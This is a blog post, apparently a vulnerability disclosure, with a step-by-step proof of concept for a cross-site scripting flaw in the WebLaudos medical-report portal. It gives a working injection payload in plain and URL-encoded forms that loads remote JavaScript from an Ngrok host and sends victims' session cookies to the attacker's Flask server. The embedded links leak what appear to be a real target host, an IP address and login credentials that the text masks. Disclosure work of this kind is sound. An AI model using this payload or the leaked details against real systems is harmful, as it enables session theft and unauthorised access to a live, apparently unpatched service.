=== Content from medium.com_4ee003d7_20250114_192949.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fd1ec40cfc183&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40wagneralves_87750%2Fpoc-cve-weblaudos-d1ec40cfc183&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40wagneralves_87750%2Fpoc-cve-weblaudos-d1ec40cfc183&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# POC CVE-2024–48312

[![Wagner Alves](https://miro.medium.com/v2/da:true/resize:fill:88:88/0*OilEEA4h6IaSToVj)](/%40wagneralves_87750?source=post_page---byline--d1ec40cfc183--------------------------------)

[Wagner Alves](/%40wagneralves_87750?source=post_page---byline--d1ec40cfc183--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fd23d8a9d2fea&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40wagneralves_87750%2Fpoc-cve-weblaudos-d1ec40cfc183&user=Wagner+Alves&userId=d23d8a9d2fea&source=post_page-d23d8a9d2fea--byline--d1ec40cfc183---------------------post_header-----------)

3 min read·Oct 11, 2024

--

Listen

Share

Ten days ago, I began a series of tests on an application called WebLaudos, developed by the company Pixeon, with the goal of identifying potential vulnerabilities. During this process, I discovered an XSS (Cross-Site Scripting) flaw. By inserting a payload that executes a remote script, it was possible to exfiltrate cookies directly to the attacker’s machine.

The version of the system that was tested was WebLaudos — 20.8 (118). I reached out to the company to report the vulnerability, but so far, I have not received a response.

Here are the details of the Proof of Concept (PoC):

**Step 1:** Log in to the portal to generate a session token.

The vulnerability can be exploited without requiring the user to authenticate, but it’s ideal to obtain a valid session token to maximize the impact.

![]()

**Step 2:** Set up the server that will receive the exfiltrated information.

![]()

The server was built using Flask and has two methods: a POST to receive the exfiltrated data and a GET to serve the JavaScript file that will be shown in the next section.

**Step 3:** Start the Ngrok service and redirect it to port 80

![]()

The Ngrok service will enable communication between the victim’s machine and the attacker’s machine. It will receive the traffic from the client machine and redirect it to the attacker’s machine on port 80.

It is important to emphasize that the connection must be HTTPS, and Ngrok also addresses this issue.

**Step 4:** Create the JavaScript that will be executed on the victim’s machine.

![]()

The aforementioned JavaScript will be loaded onto the victim’s machine via an XSS payload. Once executed, it will send the cookies to the Ngrok address, which will then redirect the traffic to the attacker’s machine, where it will be received by the Flask service running there.

**Step 5:** Start the server and execute the payload on the victim’s machine.

![]()

The payload used was:
[*http://xxxxxx.ddns.net/web\_laudos/login.asp?url\_redir=aa68t*](http://solimlab.ddns.net/web_laudos/login.asp?url_redir=aa68t)*"><script>var s=document.createElement(‘script’);s.src=’*[*https://e1bb-xxx-xxx-132-184.ngrok-free.app/a.js';document.body.appendChild(s);*](https://e1bb-177-223-132-184.ngrok-free.app/a.js%27;document.body.appendChild(s);)*</script>lb3flggcwd3&page\_args=&overwrite=N&sle\_sLogin=xxxx&sle\_sSenha=xxxxxxx&classico=*

Encoded payload:
[*http://xxxx.ddns.net/web\_laudos/login.asp?url\_redir=aa68t%22%3e%3cscript%3evar%20s=document.createElement('script');s.src='https://e1bb-xxx-xxx-132-184.ngrok-free.app/a.js';document.body.appendChild(s);%3c%2fscript%3elb3flggcwd3&page\_args=&overwrite=N&sle\_sLogin=xxxx&sle\_sSenha=xxxx&classico=*](http://solimlab.ddns.net/web_laudos/login.asp?url_redir=aa68t%22%3E%3Cscript%3Evar+s%3Ddocument.createElement%28%27script%27%29%3Bs.src%3D%27https%3A%2F%2Fe1bb-177-223-132-184.ngrok-free.app%2Fa.js%27%3Bdocument.body.appendChild%28s%29%3B%3C%2Fscript%3Elb3flggcwd3&page_args=&overwrite=N&sle_sLogin=R143885&sle_sSenha=4237&classico=)

**Step 6:** Receive the payload.

![]()

The image above shows that Ngrok received two requests: one with the POST method and another with the GET method, both returning a status code of 200.

![]()

The image above shows that a request for the JavaScript `a.js` was received, along with another request using the POST method containing the cookies, thus completing the exploitation.

[Xss Vulnerability](/tag/xss-vulnerability?source=post_page-----d1ec40cfc183--------------------------------)

--

--

[![Wagner Alves](https://miro.medium.com/v2/resize:fill:96:96/0*OilEEA4h6IaSToVj)](/%40wagneralves_87750?source=post_page---post_author_info--d1ec40cfc183--------------------------------)[![Wagner Alves](https://miro.medium.com/v2/resize:fill:128:128/0*OilEEA4h6IaSToVj)](/%40wagneralves_87750?source=post_page---post_author_info--d1ec40cfc183--------------------------------)Follow[## Written by Wagner Alves](/%40wagneralves_87750?source=post_page---post_author_info--d1ec40cfc183--------------------------------)[1 Follower](/%40wagneralves_87750/followers?source=post_page---post_author_info--d1ec40cfc183--------------------------------)·[2 Following](/%40wagneralves_87750/following?source=post_page---post_author_info--d1ec40cfc183--------------------------------)Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----d1ec40cfc183--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----d1ec40cfc183--------------------------------)[About](/about?autoplay=1&source=post_page-----d1ec40cfc183--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----d1ec40cfc183--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----d1ec40cfc183--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----d1ec40cfc183--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----d1ec40cfc183--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----d1ec40cfc183--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----d1ec40cfc183--------------------------------)[Teams](/business?source=post_page-----d1ec40cfc183--------------------------------)


